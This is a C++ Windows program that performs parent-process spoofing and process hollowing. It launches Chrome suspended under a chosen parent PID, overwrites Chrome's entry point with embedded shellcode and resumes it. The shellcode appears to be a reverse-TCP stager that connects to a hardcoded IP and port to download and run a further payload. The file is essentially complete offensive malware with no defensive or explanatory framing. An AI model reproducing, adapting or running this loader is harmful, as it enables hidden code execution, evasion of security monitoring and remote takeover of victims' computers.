#include <Windows.h>
//#include <winternl.h>
#include <iostream>
#include "syscalls.h"
#include "structs.h"
#include <errhandlingapi.h>

int main(int argc, char* argv[])
{
	STARTUPINFOEXA sie = { sizeof(sie) };
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;


	if (argc != 2)
		std::cout << "usage: program <pid>";
	else
	{
		dwPid = atoi(argv[1]);
		//if (0 == dwPid)
		//{
		//	std::cout << "Invalid pid";
		//	return 0;
		//}
		InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
		pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
		if (NULL == pAttributeList)
		{
			std::wcout << "HeapAlloc error";
			return 0;
		}
		if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
		{
			std::wcout << "InitializeProcThreatAttributeList error";
			return 0;
		}

		hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		if (NULL == hParentProcess)
		{
			std::wcout << "OpenProcess error";
			std::cout << GetLastError();
			return 0;
		}
		if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
		{
			std::wcout << "UpdateProcThreadAttribute error";
			return 0;
		}
		sie.lpAttributeList = pAttributeList;
		LPSTR proc = (LPSTR)"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
		if (!CreateProcessA(NULL, proc, NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
		{
			std::wcout << "CreateProcess error";
			return 0;
		}
		printf("Process created: %d\n", pi.dwProcessId);
		//ResumeThread(pi.hThread);

		DeleteProcThreadAttributeList(pAttributeList);
		NtClose(hParentProcess);

		// Start hollow
		DWORD pid = pi.dwProcessId;
		HANDLE hProcess = pi.hProcess;
		printf("[+] Created %s process ID at: %d\r\n", proc, pid);

		// Calculate PEB and image base offset
		PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
		ULONG retLen = 0;
		NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLen);
		PINT ImageBaseOffset = (PINT)((INT64)pbi->PebBaseAddress + 0x10);
		printf("[+] Image Base Offset found at: %p\r\n", ImageBaseOffset);

		// Read address of image base
		PINT lpImageBaseAddress = 0;
		SIZE_T bytesRead = NULL;
		NtReadVirtualMemory(hProcess, ImageBaseOffset, &lpImageBaseAddress, sizeof(lpImageBaseAddress), &bytesRead);
		//printf("[+] Read %lld bytes\r\n", bytesRead);
		printf("[+] Image Base Address found at: %p\r\n", lpImageBaseAddress);

		// Do magic
		CHAR data[0x200];
		SIZE_T bytesRead1 = NULL;
		NtReadVirtualMemory(hProcess, lpImageBaseAddress, &data, sizeof(data), &bytesRead1);
		//printf("[+] Read %lld bytes from base image\r\n", bytesRead1);

		char extractedBytes[4];
		memcpy(extractedBytes, data + 0x3C, 4);
		int extractedInteger = *reinterpret_cast<int*>(extractedBytes);

		printf("[+] e_lfanew offset at: 0x%x\r\n", extractedInteger);

		int opthdr = extractedInteger + 0x28;
		printf("[+] Entrypoint RVA offset found at: %x\r\n", opthdr);

		char entrypoint[4];
		memcpy(entrypoint, data + opthdr, 4);

		int entrypoint_rva = *reinterpret_cast<int*>(entrypoint);
		printf("[+] Entrypoint RVA value found at: %x\r\n", entrypoint_rva);

		PINT addressOfEntryPoint = (PINT)(entrypoint_rva + (INT64)lpImageBaseAddress);
		printf("[+] Entrypoint Address found at: %p\r\n", addressOfEntryPoint);

		// Shellcode execute
		unsigned char buf[] =
			"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
			"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
			"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
			"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
			"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
			"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
			"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
			"\x74\x67\x48\x01\xd0\x8b\x48\x18\x44\x8b\x40\x20\x50\x49"
			"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
			"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
			"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
			"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
			"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
			"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
			"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
			"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
			"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
			"\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\xf8\x94\x41\x54"
			"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
			"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
			"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
			"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
			"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
			"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
			"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
			"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
			"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
			"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
			"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
			"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
			"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
			"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
			"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
			"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
			"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
			"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d"
			"\x2a\x0a\x41\x89\xda\xff\xd5";

		SIZE_T nnRead = 0;
		WriteProcessMemory(hProcess, addressOfEntryPoint, buf, sizeof(buf), &nnRead);
		printf("[+] Wrote %lld bytes to entry point\r\n", nnRead);
		ResumeThread(pi.hThread);
		printf("[+] Thread resumed. Shellcode executed\r\n");
	}

	return 0;

}